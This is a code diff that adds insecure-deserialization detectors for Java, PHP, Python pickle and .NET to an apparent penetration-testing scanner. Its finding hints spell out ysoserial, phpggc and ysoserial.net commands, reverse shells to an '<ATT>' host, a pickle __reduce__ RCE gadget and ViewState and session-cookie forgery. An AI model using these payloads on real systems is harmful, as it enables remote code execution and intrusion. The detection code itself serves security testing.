@@ -2202,6 +2202,58 @@ _TOMCAT_MANAGER_PATH = re.compile(
     r'(?:manager|host-manager)/(?:html|text|status)'
 )
 
+# iter-255: Insecure-deserialization captured payload detector.
+# Fires on the language-specific serialization magic bytes / markers
+# in URLs, POST bodies, or captured HTTP requests. Each match =
+# operator captured a deserialization payload, high-value intel for
+# RCE via gadget chains.
+#
+# Java serial: `AC ED 00 05` (0xACED0005) or base64-encoded prefix
+# `rO0AB`.
+_DESER_JAVA = re.compile(
+    r'(?:\\xac\\xed\\x00\\x05|%AC%ED%00%05|'
+    # rO0AB is the first 5 base64 chars of ac-ed-00-05
+    r'\brO0AB[A-Za-z0-9+/=]{20,})'
+)
+# PHP serialize(): `O:<len>:"<class>":<fields>:{...}` or
+# `a:<count>:{...}` (array) with objects inside.
+_DESER_PHP = re.compile(
+    r'(?:'
+    r'O:\d{1,4}:"[\w\\]{1,80}":\d{1,4}:\{|'
+    # URL-encoded form
+    r'O%3A\d{1,4}%3A%22[\w%]{1,80}%22%3A\d{1,4}%3A%7B'
+    r')'
+)
+# Python pickle opcodes - very distinctive:
+#   c__main__\n         (GLOBAL __main__)
+#   cposix\nsystem      (module import)
+#   \x80\x04\x95        (protocol 4 header)
+#   __reduce__          (magic method for RCE gadgets)
+_DESER_PYTHON = re.compile(
+    r'(?:'
+    r'\bc__(?:builtin__|main__)\n|'
+    r'\bcposix\nsystem\b|'
+    r'\bcos\nsystem\b|'
+    r'\\x80\\x04\\x95|'
+    # __reduce__ appearing in captured payload/code
+    r'\b__reduce__\s*=\s*|'
+    r'\bpickle\.loads\s*\(\s*(?:request|input|params|data)'
+    r')'
+)
+# .NET BinaryFormatter/LosFormatter/ObjectStateFormatter markers.
+_DESER_DOTNET = re.compile(
+    r'(?:'
+    # AAEAAAD/////= = binary BinaryFormatter base64 prefix
+    r'\bAAEAAAD/////[A-Za-z0-9+/=]{20,}|'
+    r'\bLosFormatter\b|'
+    r'\bObjectStateFormatter\b|'
+    r'\bBinaryFormatter\b|'
+    r'System\.Runtime\.Serialization\.Formatters|'
+    # ViewState is ObjectStateFormatter - look for base64 pattern
+    r'__VIEWSTATE=[A-Za-z0-9+/=%]{40,}'
+    r')'
+)
+
 # iter-252: SSRF cloud metadata endpoint captured request/response.
 # Detects the SSRF ATTACK path (before creds are extracted). The
 # existing IMDS_BLOCK detector at line 5865 extracts already-captured
@@ -3445,6 +3497,74 @@ def _multiline_passes(path, report, store):
                                      f"hashcat -m 13100 {_sam}.tgs "
                                      f"rockyou.txt -r rules/best64."
                                      f"rule"))
+
+    # iter-255: Insecure-deserialization captured payload. Emits
+    # CRITICAL per-language with ysoserial gadget-chain notes.
+    # Doc-file gate applies.
+    if not filters.is_doc_file(path):
+        _dser_java = _DESER_JAVA.search(text[:32768])
+        _dser_php = _DESER_PHP.search(text[:32768])
+        _dser_py = _DESER_PYTHON.search(text[:32768])
+        _dser_net = _DESER_DOTNET.search(text[:32768])
+        if _dser_java:
+            report.add("CRITICAL", "SECRET-SIDECHANNEL", path,
+                       _ln(_dser_java),
+                       "Java deserialization payload captured "
+                       "(rO0AB or 0xACED0005 header)",
+                       hint=("gadget chains via ysoserial - EXAM-LEGAL "
+                             "if using ysoserial standalone jar (not "
+                             "framework):  |  java -jar ysoserial.jar "
+                             "CommonsCollections5 'bash -c \"bash -i "
+                             ">& /dev/tcp/<ATT>/4444 0>&1\"' > "
+                             "payload.ser  |  base64 -w 0 payload.ser | "
+                             "curl --data-binary @- <target-endpoint>"
+                             "  |  common chains: CC5, CC6, CC7 (Apache "
+                             "Commons Collections), Spring1, Groovy1, "
+                             "Hibernate1  |  target hint: JSF ViewState"
+                             "/RMI/JMX/Struts2 endpoints most common"))
+        if _dser_php:
+            report.add("CRITICAL", "SECRET-SIDECHANNEL", path,
+                       _ln(_dser_php),
+                       "PHP object-serialization payload captured "
+                       "(O:<len>:... form)",
+                       hint=("PHP gadget chains via phpggc - EXAM-LEGAL"
+                             " standalone tool:  |  phpggc -e url "
+                             "Laravel/RCE1 system 'bash -c \"bash -i "
+                             ">& /dev/tcp/<ATT>/4444 0>&1\"'  |  "
+                             "common frameworks: Laravel, Symfony, "
+                             "WordPress, TCPDF, Guzzle  |  targets: "
+                             "unserialize() on cookies, POST params, "
+                             "phar:// LFI-chained deser"))
+        if _dser_py:
+            report.add("CRITICAL", "SECRET-SIDECHANNEL", path,
+                       _ln(_dser_py),
+                       "Python pickle deserialization payload captured",
+                       hint=("gadget: `class E:\\n  def __reduce__("
+                             "self):\\n    return (os.system, ('bash "
+                             "-c \\\"bash -i >& /dev/tcp/<ATT>/4444 0>"
+                             "&1\\\"',))`; then pickle.dumps(E()) and "
+                             "b64-encode  |  common target: cookie "
+                             "value fed to pickle.loads(base64.b64"
+                             "decode(cookie))  |  Django/Flask "
+                             "session cookies signed with SECRET_KEY "
+                             "if leaked: forge deserializable session"))
+        if _dser_net:
+            report.add("CRITICAL", "SECRET-SIDECHANNEL", path,
+                       _ln(_dser_net),
+                       ".NET deserialization payload / ViewState "
+                       "captured (BinaryFormatter / LosFormatter / "
+                       "ObjectStateFormatter)",
+                       hint=("gadget chains via ysoserial.net - "
+                             "EXAM-LEGAL standalone:  |  ysoserial.net"
+                             ".exe -g TypeConfuseDelegate -f "
+                             "BinaryFormatter -c \"cmd /c whoami\" -o "
+                             "base64  |  common formatters: "
+                             "BinaryFormatter, LosFormatter, "
+                             "ObjectStateFormatter, JavaScriptSerializer,"
+                             " DataContractSerializer  |  ViewState: "
+                             "if MAC validation disabled, forge via "
+                             "-g TypeConfuseDelegate -f ObjectStateFor"
+                             "matter --path=\"/\" --apppath=\"/\""))
 
     # iter-252: SSRF cloud metadata endpoint captured. Fires on any
     # provider's metadata endpoint URL OR response-body identifier.
